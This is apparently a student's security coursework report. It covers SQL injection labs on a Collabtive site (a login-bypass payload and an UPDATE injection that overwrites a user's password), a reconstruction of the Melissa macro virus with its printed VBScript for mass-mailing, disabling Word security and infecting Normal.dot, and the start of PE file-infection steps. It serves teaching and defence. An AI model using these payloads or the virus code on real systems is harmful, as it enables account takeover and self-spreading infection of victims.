<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">service</span> apache2 restart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>访问：<a target="_blank" rel="noopener" href="http://www.sqllabcollabtive.com/">www.sqllabcollabtive.com</a></p>
<p>查看登陆验证文件源码：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /var/www/SQL/Collabtive/include/class.user.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在第375行，可以找到登录时后台执行的sql语句。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">sel1 <span class="token operator">=</span> <span class="token function">mysql_query</span> <span class="token punctuation">(</span><span class="token string">"SELECT ID, name, locale, lastlogin, gender, FROM user WHERE (name = '$user' OR email = '$user') AND pass = '$pass'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>我们发现这里的sql语句是通过user变量的值来拼接的，那么我们可以构造一个语句，在不知道密码的情况下登陆，构造好之后，登录时后台查询的语句会变成下面的样子（不要修改class.user.php）：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">sel1 <span class="token operator">=</span> <span class="token function">mysql_query</span> <span class="token punctuation">(</span><span class="token string">"SELECT ID, name, locale, lastlogin, gender, FROM user WHERE (name = '$user ') #' OR email = '$user') AND pass = '$pass'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>为了验证上面的思路，我们在登录表单中输入用户名<code>admin&#39;)#</code>，密码随意。然后点击登录，发现登录成功了：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221127165458939.png" alt="image-20221127165458939"></p>
<h4 id="（2）实验任务二-1"><a href="#（2）实验任务二-1" class="headerlink" title="（2）实验任务二"></a>（2）实验任务二</h4><p>本任务实现对Update语句中的sql注入。</p>
<p>Collabtive平台中可以更新用户信息，用户信息编辑的链接如下（登录后访问）：<a target="_blank" rel="noopener" href="http://www.sqllabcollabtive.com/manageuser.php?action=editform&amp;id=1">http://www.sqllabcollabtive.com/manageuser.php?action=editform&amp;id=1</a></p>
<p>在Collabtive web应用程序中，如果用户想更新他们的个人资料，他们可以去我的帐户，单击编辑链接，然后填写表格以更新资料信息。在用户发送更新请求到服务器，这个过程的实现是由<code>include/class.user.php</code>文件来完成的。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /var/www/SQL/Collabtive/include/class.user.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-c" data-language="c"><code class="language-c">function <span class="token function">edit</span><span class="token punctuation">(</span>$id<span class="token punctuation">,</span> $name<span class="token punctuation">,</span> $realname<span class="token punctuation">,</span> $email<span class="token punctuation">,</span> $tel1<span class="token punctuation">,</span> $tel2<span class="token punctuation">,</span> $company<span class="token punctuation">,</span>
             $zip<span class="token punctuation">,</span> $gender<span class="token punctuation">,</span> $url<span class="token punctuation">,</span> $address1<span class="token punctuation">,</span> $address2<span class="token punctuation">,</span> $state<span class="token punctuation">,</span>
             $country<span class="token punctuation">,</span> $tags<span class="token punctuation">,</span> $locale<span class="token punctuation">,</span> $avatar <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">,</span> $rate <span class="token operator">=</span> <span class="token number">0.0</span><span class="token punctuation">)</span>
   <span class="token punctuation">&#123;</span>
   $name <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span>$name<span class="token punctuation">)</span><span class="token punctuation">;</span>
   $realname <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span>$realname<span class="token punctuation">)</span><span class="token punctuation">;</span>

   <span class="token comment">//modified for SQL Lab</span>

   <span class="token comment">//$company = mysql_real_escape_string($company);</span>

   $email <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span>$email<span class="token punctuation">)</span><span class="token punctuation">;</span>

   <span class="token comment">// further escaped parameters removed for brevity...</span>
   $rate <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">float</span><span class="token punctuation">)</span> $rate<span class="token punctuation">;</span>
   $id <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> $id<span class="token punctuation">;</span>

   <span class="token keyword">if</span> <span class="token punctuation">(</span>$avatar <span class="token operator">!=</span> <span class="token string">""</span><span class="token punctuation">)</span>
       <span class="token punctuation">&#123;</span>
           $upd <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span>"UPDATE user SET name<span class="token operator">=</span><span class="token char">'$name'</span><span class="token punctuation">,</span> email<span class="token operator">=</span><span class="token char">'$email'</span><span class="token punctuation">,</span>

                               tel1<span class="token operator">=</span><span class="token char">'$tel1'</span><span class="token punctuation">,</span> tel2<span class="token operator">=</span><span class="token char">'$tel2'</span><span class="token punctuation">,</span> company<span class="token operator">=</span><span class="token char">'$company'</span><span class="token punctuation">,</span>

                               zip<span class="token operator">=</span><span class="token char">'$zip'</span><span class="token punctuation">,</span> gender<span class="token operator">=</span><span class="token char">'$gender'</span><span class="token punctuation">,</span> url<span class="token operator">=</span><span class="token char">'$url'</span><span class="token punctuation">,</span>

                               adress<span class="token operator">=</span><span class="token char">'$address1'</span><span class="token punctuation">,</span> adress2<span class="token operator">=</span><span class="token char">'$address2'</span><span class="token punctuation">,</span>

                               state<span class="token operator">=</span><span class="token char">'$state'</span><span class="token punctuation">,</span> country<span class="token operator">=</span><span class="token char">'$country'</span><span class="token punctuation">,</span>

                               tags<span class="token operator">=</span><span class="token char">'$tags'</span><span class="token punctuation">,</span> locale<span class="token operator">=</span><span class="token char">'$locale'</span><span class="token punctuation">,</span>

                               avatar<span class="token operator">=</span><span class="token char">'$avatar'</span><span class="token punctuation">,</span> rate<span class="token operator">=</span><span class="token char">'$rate'</span> WHERE ID <span class="token operator">=</span> $id"<span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">&#125;</span>
   <span class="token keyword">else</span>
       <span class="token punctuation">&#123;</span>
           <span class="token comment">// same query as above minus setting avatar; removed for</span>
           <span class="token comment">// brevity</span>
       <span class="token punctuation">&#125;</span>
   <span class="token keyword">if</span> <span class="token punctuation">(</span>$upd<span class="token punctuation">)</span>
       <span class="token punctuation">&#123;</span>
           $this<span class="token operator">-></span>mylog<span class="token operator">-></span><span class="token function">add</span><span class="token punctuation">(</span>$name<span class="token punctuation">,</span> <span class="token char">'user'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
           <span class="token keyword">return</span> true<span class="token punctuation">;</span>
       <span class="token punctuation">&#125;</span>
   <span class="token keyword">else</span>
       <span class="token punctuation">&#123;</span>
           <span class="token keyword">return</span> false<span class="token punctuation">;</span>
       <span class="token punctuation">&#125;</span>
   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们查看源码可知，代码中是存在注入的，我们修改用户资料时，可以尝试修改company参数，进行注入。在编辑用户的位置，user 填 ted，Company 处填：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token string">', `pass` = '</span><span class="token number">9</span>d4e1e23bd5b727046a9e3b4b7db57bd8d6ee684<span class="token string">' WHERE ID = 4 # '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这里的 9d4e1e23bd5b727046a9e3b4b7db57bd8d6ee684 就是pass的SHA1值。</p>
<p>点击修改，然后我们退出当前用户，使用ted用户登录，这个时候ted用户的密码应该是pass：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221127170910036.png" alt="image-20221127170910036"></p>
<h4 id="（3）实验任务三-1"><a href="#（3）实验任务三-1" class="headerlink" title="（3）实验任务三"></a>（3）实验任务三</h4><p>策略1：<strong>防御转义特殊字符使用</strong></p>
<p>开启magic_quotes_gpc，将magic_quotes_gpc值设为On。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /etc/php5/apache2/php.ini
<span class="token function">sudo</span> <span class="token function">service</span> apache2 restart<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230109212340834.png" alt="image-20230109212340834"></p>
<p>使用此方法之后，发现不能成功注入。</p>
<p>策略2：<strong>避免使用特殊字符</strong></p>
<p>MySQL提供一个函数 <code>mysql_real_escape_string()</code>，这个函数可以用来过滤一些特殊字符；如 <code>\x00</code>, <code>\n</code>, <code>\r</code>, <code>\</code>, <code>&#39;, &quot;</code> ,<code>\x1a</code>。</p>
<p>修改登录处如下：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221127171250544.png" alt="image-20221127171250544"></p>
<p>修改编辑资料处：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221127171444131.png" alt="image-20221127171444131"></p>
<p>使用此方法之后，发现不能成功注入。</p>
<h3 id="2-4-实验结果分析-1"><a href="#2-4-实验结果分析-1" class="headerlink" title="2.4 实验结果分析"></a>2.4 实验结果分析</h3><p>在B&#x2F;S模式中，用户可以通过GET或POST等方式，对服务器发出HTTP请求；在服务器端，对数据库执行查询操作，将查询的结果返回浏览器端。黑客利用上述过程，将精心构造的请求放到传入的变量参数中，让服务器端执行恶意代码以进行SQL注入攻击，从而达到了读取数据库中敏感信息的效果，甚至将数据库删除。</p>
<p>在本实验中，我们分别利用SELECT和UPDATE语句进行了SQL注入攻击。由于SQL注入攻击本质上是用户将输入作为可执行SQL命令的一部分导致的，所以我们通过参数与查询分离的思想，在代码层对SQL注入攻击进行了相应防御。</p>
<h2 id="第三章-结论与心得-1"><a href="#第三章-结论与心得-1" class="headerlink" title="第三章 结论与心得"></a>第三章 结论与心得</h2><p>通过本实验，我通过实际操作SQL注入攻击，对其攻击过程有了一个直观的感受，也了解了SQL注入攻击带来的巨大危害，如盗取数据、对网页信息进行篡改、通过提权远程控制服务器等。</p>
<p>在近几年OWASP公布的Web应用十大安全漏洞排名中，SQL注入稳居榜首第4。虽然其原理及利用方式并不复杂，但对目标网站造成的破坏力巨大。我们能认识到，造成SQL注入漏洞的根本原因是开发人员违背了“代码与数据分离”的原则，故在Web应用开发的过程中就应该对相关安全问题予以足够的重视，这比后期维护或造成攻击后再去补救带来的成本要低得多。</p>
<h1 id="实验三-宏病毒-选题11"><a href="#实验三-宏病毒-选题11" class="headerlink" title="实验三 宏病毒(选题11)"></a>实验三 宏病毒(选题11)</h1><h2 id="第一章-实验环境说明-2"><a href="#第一章-实验环境说明-2" class="headerlink" title="第一章 实验环境说明"></a>第一章 实验环境说明</h2><p>实验环境为 <code>Win XP</code>，在蚁景云平台中完成。</p>
<h2 id="第二章-宏病毒实验过程"><a href="#第二章-宏病毒实验过程" class="headerlink" title="第二章 宏病毒实验过程"></a>第二章 宏病毒实验过程</h2><h3 id="2-1-实验任务及目的-2"><a href="#2-1-实验任务及目的-2" class="headerlink" title="2.1 实验任务及目的"></a>2.1 实验任务及目的</h3><p><strong>实验任务</strong>：</p>
<ol>
<li>编写宏代码；</li>
<li>编写和实现梅丽莎病毒代码，模拟该病毒的操作过程，并分析该病毒的运行原理。</li>
</ol>
<p><strong>实验目的</strong>：</p>
<ol>
<li>了解梅丽莎宏病毒基本概念，对宏病毒有一个比较深入的理解；</li>
<li>自己实验梅丽莎宏病毒，体会到宏病毒的危害所在。</li>
</ol>
<h3 id="2-2-实验方案设计-2"><a href="#2-2-实验方案设计-2" class="headerlink" title="2.2 实验方案设计"></a>2.2 实验方案设计</h3><p><strong>实验场景</strong>：操作系统为 <code>Win XP</code>，实验在<code>Word</code>，<code>Outlook Express</code> 软件中进行。</p>
<p><strong>实验原理</strong>：</p>
<p>宏是一个批处理程序命令，正确地运用它可以提高工作效率。解释器或编译器在遇到宏时会自动进行这一模式替换。对于编译语言，宏展开在编译时发生，进行宏展的工具常被称为宏展开器。</p>
<p>微软的office软件运行用户自己编写的称为 <code>VBA</code> 的脚本来增加其灵活性，进一步扩充它的能力。如完成一个一打开word文件同时要打开某个文件的功能，必须要自己编写一段称之为宏的脚本。</p>
<p>在本实验中，我们通过编写宏代码，模拟梅丽莎病毒的操作过程，并分析梅丽莎病毒的运行机理。</p>
<h3 id="2-3-实验过程记录-2"><a href="#2-3-实验过程记录-2" class="headerlink" title="2.3 实验过程记录"></a>2.3 实验过程记录</h3><h4 id="（1）实验任务一-2"><a href="#（1）实验任务一-2" class="headerlink" title="（1）实验任务一"></a>（1）实验任务一</h4><p>1、桌面右击新建一个word文档</p>
<p>2、在新文档中打开工具-&gt;宏—&gt;宏</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208201915407.png" alt="image-20221208201915407"></p>
<p>输入如下代码：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208202020815.png" alt="image-20221208202020815"></p>
<p>关闭宏代码编辑器，将文档存盘并关闭；</p>
<p> 再次启动刚刚保存的文档时，发现多了一个cmd窗口</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208202121588.png" alt="image-20221208202121588"></p>
<h4 id="（2）实验任务二-2"><a href="#（2）实验任务二-2" class="headerlink" title="（2）实验任务二"></a>（2）实验任务二</h4><p>梅丽莎病毒的特点是：该病毒通过电子邮件的方式传播，当用户打开附件中的”list.doc”文件时，将立刻中招。</p>
<p>病毒的代码使用Word的VBA语言编写, 开创了此类病毒的先河, 如同病毒作者的猖狂之言”It’s a new age!”。</p>
<p>病毒通过对注册表进行修改, 并调用Outlook(现在用这个玩意的较少了)发送含有病毒的邮件, 进行快速传播。由于该病毒发送的邮件的发件人是用户熟悉的, 因此往往被很多人忽视。同时, 该病毒会自动重复以上的动作, 由此引起连锁反应, 在短时间内, 造成邮件服务器的大量阻塞, 严重影响正常网络通讯。</p>
<p>该病毒可感染Word97、Word2000的Doc文件, 并修改通用模板Normal.dot, 使受害者几乎永无”脱离苦海”之时。</p>
<p>配置客户端邮件地址（因为这个梅丽莎病毒主要是针对这个outlook的。）</p>
<p>开始–&gt;电子邮件–&gt;设置邮件账户–&gt;输入你的邮箱地址–&gt;根据所使用的邮箱类型设置pop3和smtp的地址–&gt;输入密码–&gt;ok设置邮件账户就基本完成了：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208202517993.png" alt="image-20221208202517993"></p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208202651648.png" alt="image-20221208202651648"></p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208202736106.png" alt="image-20221208202736106"></p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208202756371.png" alt="image-20221208202756371"></p>
<p>点击工具–&gt;通讯簿，右键联系人–&gt;新建联系人–&gt;填写好后点击确定</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208203148215.png" alt="image-20221208203148215"></p>
<p>设置宏的安全性，默认是不允许运行未经签署的宏。</p>
<p>新建一个word文档–&gt;工具–&gt;宏–&gt;安全性–&gt;将安全性设置为中</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208203322507.png" alt="image-20221208203322507"></p>
<p><strong>模拟宏病毒发作</strong></p>
<p>新建另一个宏，将代码全部复制并覆盖进去。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208204136192.png" alt="image-20221208204136192"></p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208204209372.png" alt="image-20221208204209372"></p>
<p>点击运行，这个时候发现电脑变的很慢，趋于死机状态：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208204226406.png" alt="image-20221208204226406"></p>
<p>关闭Word（用任务管理器强制结束进程）：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208204437860.png" alt="image-20221208204437860"></p>
<p>在开始-运行中输入 <code>regedit</code> ，打开注册表编辑器，查看”<code>HKEY_CURRENT_USER\Software\Microsoft\Office</code>“下Melissa的值，发现等于”… byKwyjibo”：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20221208204649495.png" alt="image-20221208204649495"></p>
<h4 id="（3）实验任务三-2"><a href="#（3）实验任务三-2" class="headerlink" title="（3）实验任务三"></a>（3）实验任务三</h4><p>任务描述：病毒源码分析</p>
<p>1、 病毒被激活后，将修改注册表中的”<code>HKEY_CURRENT_USER\Software\Microsoft\office\</code>“键，并增加项”Melissa?”, 赋值为”… by Kwyjibo”(病毒作者的大名)，并将此作为是否已感染病毒的标志。</p>
<p>病毒中相关操作的核心代码如下所示：</p>
<pre class="line-numbers language-vbscript" data-language="vbscript"><code class="language-vbscript">&#39;读取注册表项的内容, 进行判断
If System.PrivateProfileString(&quot;&quot;,&quot;HKEY_CURRENT_USER\Software\Microsoft\office\&quot;,&quot;Melissa？&quot;)&lt;&gt;&quot;… by Kwyjibo&quot; Then
&#39;其它操作代码 ...
&#39;设置感染标志
System.PrivateProfileString(&quot;HKEY_CURRENT_USER\Software\Microsoft\office\&quot;,&quot;Melissa？&quot;)&#x3D; &quot;… by Kwyjibo&quot;
End If<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>2、发送邮件</strong></p>
<p>在Outlook程序启动的情况下, 梅丽莎病毒将自动给地址簿中的成员(前50名)发送邮件, 主题为”Important Message From “, 用户名”<code>&lt;user&gt;</code>“为Word软件的用户名, 邮件的正文为”Here is that document you asked for … don’t show anyone else;”，邮件的附件为一个文件名为”list.doc”的带毒文件。</p>
<p>为了实现上述功能, 病毒利用获取了地址薄中所有的邮件地址, 并发送内嵌病毒代码的邮件, 达到了<strong>疯狂传播</strong>的目的。</p>
<p>注意：在本实验中OutLook中至少要有一名含有有效邮件地址的联系人。</p>
<p>病毒中相关操作的核心代码如下所示：</p>
<pre class="line-numbers language-vbscript" data-language="vbscript"><code class="language-vbscript">Dim UngaDasOutlook,DasMapiName,BreakUmoffASlice

&#39;创建Outlook应用程序实例对象
Set UngaDasOutlook&#x3D;CreateObject(&quot;Outlook.Application&quot;)

&#39;获取MAPI对象
Set DasMapiName&#x3D; UngaDasOutlook.GetNameSpace(&quot;MAPI&quot;) 
If UngaDasOutlook&#x3D;&quot;Outlook&quot; Then
DasMapiName.Logon &quot;profile&quot;,&quot;password&quot;

&#39;遍历地址薄, 进行邮件发送操作
For y&#x3D;1 ToDasMapiName.AddressLists.Count
Set AddyBook&#x3D; DasMapiName.AddressLists(y)
X&#x3D;1
Set BreakUmoffASlice&#x3D; UngaDasOutlook.CreateItem(0)
For oo&#x3D;1 To AddyBook.AddressEntries.Count
            
&#39;获取第n个收件人地址
Peep&#x3D;AddyBook.AddressEntries(x)

&#39;加入收件人地址
BreakUmoffASlice.Recipients.Add Peep
X&#x3D;x+1
If x&gt;50 Then oo&#x3D; AddyBook.AddressEntries.Count
Next oo

&#39;设置邮件的主题
BreakUmoffASlice.Subject&#x3D;&quot;Important Message From &quot;&amp;Application.UserName

&#39;设置邮件的正文
BreakUmoffASlice.Body&#x3D;&quot;Here is that document you asked for… don&#39;t show anyone else :-)&quot;

&#39;加入邮件的附件
BreakUmoffASlice.Attachments.AddActiveDocument.FullName

&#39;发送邮件
BreakUmoffASlice.Send
Next y

&#39;断开连接
DasMapiName.Logoff
Peep&#x3D;&quot;&quot;
End If<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>3、<strong>修改Word模版</strong></p>
<p>梅丽莎病毒激活后， 将感染Word97和Word2000的文档并修改通用模板Normal.dot，使感染后的Word运行时”宏”菜单项不能使用，并且导致Word软件对文件转换、打开带有宏的文件、Normal.dot遭到修改后都不会出现警告, 使病毒的魔爪”天衣无缝”。最后, 将<strong>病毒自身的代码和所做的设置修改</strong>,利用一个很高超的方法一同写入<strong>Normal.dot</strong>之中, 使用户以后打开Word时病毒反复发作。</p>
<p>病毒中相关操作的核心代码如下所示：</p>
<pre class="line-numbers language-vbscript" data-language="vbscript"><code class="language-vbscript">&#39;使&quot;宏&quot;工具栏的&quot;安全&quot;项无效
CommandBars(&quot;Macro&quot;).Controls(&quot;Security…&quot;).Enabled&#x3D;False

&#39;使&quot;工具&quot;菜单栏的&quot;宏&quot;项无效
CommandBars(&quot;Tools&quot;).Controls(&quot;Macro&quot;).Enabled&#x3D;False

&#39;将&quot;0&quot;(1-1)值赋于ConfirmConversions属性,使&quot;文件转换&quot;对话框不显示
Options.ConfirmConversions&#x3D;(1-1)

&#39;将,&quot;0&quot;（1-1）值赋于VirusProtection属性, 使&quot;宏警告&quot;对话框不显示
Options.VirusProtection&#x3D;(1-1)

&#39;将&quot;0&quot;(1-1)值赋于SaveNormalPrompt属性,使Normal.dot被修改后不显示警告对话框
Options.SaveNormalPrompt&#x3D;(1-1)

&#39;获取当前文档的VBA工程的第1个模块名称
Set ADI1&#x3D;ActiveDocument.VBProject.VBComponents.Item(1)

&#39;获取Normal.dot的VBA工程的第1个模块名称
Set NTI1&#x3D;NormalTemplate.VBProject.VBComponents.Item(1)
NTCL&#x3D;NTI1.CodeModule.CountOfLines
ADCL&#x3D;ADI1.CodeModule.CountOfLines
BGN&#x3D;2

&#39;如果当前文档未感染
If ADI1.Name&lt;&gt;&quot;Melissa&quot; Then

&#39;修改VBA工程的第1个模块名称为&quot;Melissa&quot;
If ADCL&gt;0 Then ADI1.CodeModule.DeleteLines 1,ADCL
Set ToInfect&#x3D;ADI1
ADI1.Name&#x3D;&quot;Melissa&quot;
DoAD&#x3D;True
End If

&#39;如果Normal.dot未感染
If NTI1.Name &lt;&gt; &quot;Melissa&quot; Then

&#39;修改VBA工程的第1个模块名称为&quot;Melissa&quot;
If NTCL&gt;0 Then NTI1.CodeModule.DeleteLines 1,NTCL
Set ToInfect&#x3D;NTI1
NTI1.Name&#x3D;&quot;Melissa&quot;
DoNT&#x3D;True
End If

&#39;如果都已感染, 跳转执行以后的命令
If DoNT&lt;&gt; True AndDoAD&lt;&gt; True Then GoTo CY

&#39;开始感染Normal.dot
If DoNT&#x3D;True Then
Do While ADI1.CodeModule.Lines(1,1)&#x3D;&quot;&quot;
ADI1.CodeModule.DeleteLines 1
Loop

ToInfect.CodeModule.AddFromString(&quot;Private Sub Document_Close()&quot;)
Do While ADI1.CodeModule.Lines(BGN,1) &lt;&gt; &quot;&quot;
ToInfect.CodeModule.InsertLines BGN,ADI1.CodeModule.Lines(BGN,1)
BGN&#x3D;BGN+1
Loop
End If

If DoAD&#x3D;True Then  &#39;开始感染当前文档
Do While NTI1.CodeModule.Lines(1,1)&#x3D;&quot;&quot;
NTI1.CodeModule.DeleteLines 1
Loop

ToInfect.CodeModule.AddFromString(&quot;Private Sub Document.Open()&quot;)

Do While NTI1.CodeModule.Lines(BGN,1)&lt;&gt;&quot;&quot;
ToInfect.CodeModule.InsertLines BGN,NTI1.CodeModule.Lines(BGN,1)
BGN&#x3D;BGN+1
Loop
End If

CYA:

&#39;保存被修改的当前文档和Normal.dot
If NTCL&lt;&gt;0 And ADCL&#x3D;0 And (InStr(1,ActiveDocument.Name,&quot;Document&quot;)&#x3D;False) Then
ActiveDocument.SaveAsFileName&#x3D;ActiveDocument.FullName
ElseIf (InStr(1,ActiveDocument.Name,&quot;Document&quot;)&lt;&gt;False) Then
ActiveDocument.Saved&#x3D;True
End If
End If<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="2-4-实验结果分析-2"><a href="#2-4-实验结果分析-2" class="headerlink" title="2.4 实验结果分析"></a>2.4 实验结果分析</h3><p>从实验来看，梅丽莎病毒通过修改注册表、发送邮件、修改 <code>Word</code> 模板等步骤，成功对受害机的 <code>Word</code> 软件进行感染，并通过 <code>Outlook</code> 软件转发给受害者的联系人，实现对更多人的感染，危害性极大。</p>
<h2 id="第三章-结论与心得-2"><a href="#第三章-结论与心得-2" class="headerlink" title="第三章 结论与心得"></a>第三章 结论与心得</h2><p>宏病毒是一种寄存在文档或模板的宏中的计算机病毒。一旦打开这样的文档，其中的宏就会被执行，于是宏病毒就会被激活，转移到计算机上，并驻留在 <code>Normal</code> 模板上。通过对本实验的实际操作，我对宏的基本概念和宏病毒的运行机制有了更深入的了解，对梅丽莎病毒的危害性有了一个比较全面的认识，收获很大。</p>
<h1 id="实验四-PE病毒之感染机制与手动清除-选题14"><a href="#实验四-PE病毒之感染机制与手动清除-选题14" class="headerlink" title="实验四 PE病毒之感染机制与手动清除(选题14)"></a>实验四 PE病毒之感染机制与手动清除(选题14)</h1><h2 id="第一章-实验环境说明-3"><a href="#第一章-实验环境说明-3" class="headerlink" title="第一章 实验环境说明"></a>第一章 实验环境说明</h2><p>本实验的实验环境是 <code>Windows xp sp3</code>，在蚁景云平台中完成。</p>
<h2 id="第二章-PE病毒之感染机制与手动清除实验过程"><a href="#第二章-PE病毒之感染机制与手动清除实验过程" class="headerlink" title="第二章 PE病毒之感染机制与手动清除实验过程"></a>第二章 PE病毒之感染机制与手动清除实验过程</h2><h3 id="2-1-实验任务及目的-3"><a href="#2-1-实验任务及目的-3" class="headerlink" title="2.1 实验任务及目的"></a>2.1 实验任务及目的</h3><p><strong>实验任务</strong>：</p>
<ol>
<li>对PE病毒的感染机制进行分析；</li>
<li>利用感染原理，逆向清除感染型病毒。</li>
</ol>
<p><strong>实验目的</strong>：</p>
<p>本实验介绍文件感染型病毒。通过执行病毒程序，使目标程序被感染。通过PE工具来对比查看文件感染前后的不同来确定文件的感染方式，最后进行手动清除感染型病毒。</p>
<h3 id="2-2-实验方案设计-3"><a href="#2-2-实验方案设计-3" class="headerlink" title="2.2 实验方案设计"></a>2.2 实验方案设计</h3><p><strong>实验场景</strong>：操作系统为 <code>Win XP</code>，实验所需的软件有 <code>stud_PE</code>，<code>PEditor</code>，<code>WinHex</code>，<code>masm32</code>。</p>
<p><strong>实验原理</strong>：</p>
<p>一个 <code>PE</code> 文件中的常用区段如下：</p>
<ul>
<li><code>.text</code>：代码段，可读、可执行；</li>
<li><code>.data</code>：存放全局变量、全局常量等；</li>
<li><code>.idata</code>：导入函数的代码段，存放外部函数地址；</li>
<li><code>.rdata</code>：资源数据段（包括自己打包的，还有开发工具打包的）；</li>
<li><code>.reloc</code>：实现重定位</li>
</ul>
<p><code>PE</code> 病毒编写的关键技术主要是：</p>
<ul>
<li>定位</li>
<li>获取 <code>API</code> 函数</li>
<li>搜索目标文件</li>
<li>感染</li>
<li>破坏</li>
</ul>
<p>实现对PE文件病毒的感染有三种方式：</p>
<p><strong>方法1：节添加</strong></p>
<p>1、判断目标文件开始的两个字节是否为“<code>MZ</code>”；</p>
<p>2、判断PE文件的标记（“<code>PE</code>”）；</p>
<p>3、判断感染标记，如果已被感染过就跳出，去执行宿主程序，否则继续；</p>
<p>4、获得数据目录(<code>Data Directory</code>)的个数（每个数据目录占8个字节）；</p>
<p>5、得到节表的起始地址（数据目录的偏移地址+数据目录占用的字节数&#x3D;节表起始位置）</p>
<p>6、得到节表的末尾偏移（紧接其后用于写入一个新的病毒节信息），节表的起始地址+节的个数*28H（每个节表占用的字节数）&#x3D;节表的末尾偏移</p>
<p>7、开始写入节表：</p>
<p>a）写入节名（8字节）。</p>
<p>b）写入节的实际字节数（4字节）。</p>
<p>c）写入新节在内存中的开始偏移地址（4字节），同时可以计算出病毒入口位置。 上一个节在内存中的开始偏移地址+（上一个节的大小&#x2F;节对齐+1）*节对齐&#x3D;本节在内存中的开始偏移地址。</p>
<p>d）写入本节（即病毒节）在文件中对齐后的大小。</p>
<p>e）写入本节在文件中的开始位置。 上节在文件中的开始位置+上节对齐后的大小&#x3D;本节（即病毒）在文件中的开始位置。</p>
<p>8、修改映像文件头的节表数目</p>
